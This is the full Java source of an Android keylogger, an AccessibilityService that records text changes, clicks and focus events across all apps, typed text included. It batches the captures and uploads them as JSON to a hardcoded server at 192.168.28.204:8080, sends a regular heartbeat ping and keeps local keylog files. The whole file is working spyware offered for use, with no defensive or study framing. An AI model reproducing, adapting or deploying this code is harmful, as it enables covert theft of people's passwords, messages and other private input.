package com.bshu2.androidkeylogger;

import android.accessibilityservice.AccessibilityService;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class Keylogger extends AccessibilityService {

    // ================= CONFIG =================
    private static final String SERVER_URL = "http://192.168.28.204:8080";
    private static final int FLUSH_INTERVAL_MS = 1000;   // flush every 1s
    private static final int FLUSH_THRESHOLD = 5;        // or after 5 events
    private static final int HEARTBEAT_MS = 20000;       // ping every 20s
    // ==========================================

    private static final String TAG = "Keylogger";

    private final List<JSONObject> pending = new ArrayList<>();
    private final Object lock = new Object();
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final SimpleDateFormat df =
            new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US);
    private final String deviceName = Build.MODEL; // e.g. "Moto G", "Redmi Note 8"

    // ---------- periodic flush task ----------
    private final Runnable flushTask = new Runnable() {
        @Override
        public void run() {
            flush();
            handler.postDelayed(this, FLUSH_INTERVAL_MS);
        }
    };

    // ---------- heartbeat (online/offline status) ----------
    private final Runnable pingTask = new Runnable() {
        @Override
        public void run() {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String url = SERVER_URL.replace("/log", "/ping")
                                + "?device=" + URLEncoder.encode(deviceName, "UTF-8");
                        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                        c.setConnectTimeout(5000);
                        c.setReadTimeout(5000);
                        c.getResponseCode(); // force the request
                        c.disconnect();
                    } catch (Exception e) {
                        Log.e(TAG, "ping failed", e);
                    }
                }
            }).start();
            handler.postDelayed(this, HEARTBEAT_MS);
        }
    };

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "Starting service");
        handler.postDelayed(flushTask, FLUSH_INTERVAL_MS);
        handler.postDelayed(pingTask, HEARTBEAT_MS);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String action;
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                action = "TEXT";
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                action = "CLICKED";
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                action = "FOCUSED";
                break;
            default:
                return;
        }

        String ts = df.format(Calendar.getInstance().getTime());
        String data = event.getText().toString();

        try {
            JSONObject o = new JSONObject();
            o.put("timestamp", ts);
            o.put("action", action);
            o.put("data", data);
            o.put("device", deviceName);

            synchronized (lock) {
                pending.add(o);
                if (pending.size() >= FLUSH_THRESHOLD) {
                    flushLocked();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "build entry failed", e);
        }

        // always save locally, even if the network fails
        appendLocal(ts + " | " + deviceName + " | " + action + " | " + data + "\n");
    }

    private void flush() {
        synchronized (lock) {
            flushLocked();
        }
    }

    private void flushLocked() {
        if (pending.isEmpty()) return;

        final List<JSONObject> toSend = new ArrayList<>(pending);
        pending.clear();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    StringBuilder sb = new StringBuilder("[");
                    for (int i = 0; i < toSend.size(); i++) {
                        if (i > 0) sb.append(',');
                        sb.append(toSend.get(i).toString());
                    }
                    sb.append(']');

                    byte[] payload = sb.toString().getBytes(StandardCharsets.UTF_8);

                    HttpURLConnection c = (HttpURLConnection) new URL(SERVER_URL).openConnection();
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    c.setConnectTimeout(5000);
                    c.setReadTimeout(5000);
                    c.setDoOutput(true);
                    OutputStream os = c.getOutputStream();
                    os.write(payload);
                    os.flush();
                    os.close();
                    int code = c.getResponseCode(); // force send
                    c.disconnect();
                    Log.d(TAG, "uploaded " + toSend.size() + " entries, code=" + code);
                } catch (Exception e) {
                    Log.e(TAG, "upload failed, logs kept locally", e);
                }
            }
        }).start();
    }

    private void appendLocal(String line) {
        try {
            File dir = getExternalFilesDir(null);
            if (dir == null) dir = getFilesDir();
            File f = new File(dir, "keylog_"
                    + new SimpleDateFormat("yyyyMMdd", Locale.US).format(new Date()) + ".txt");
            FileOutputStream fos = new FileOutputStream(f, true);
            fos.write(line.getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "local write failed", e);
        }
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        flush();
        handler.removeCallbacks(flushTask);
        handler.removeCallbacks(pingTask);
        super.onDestroy();
    }
}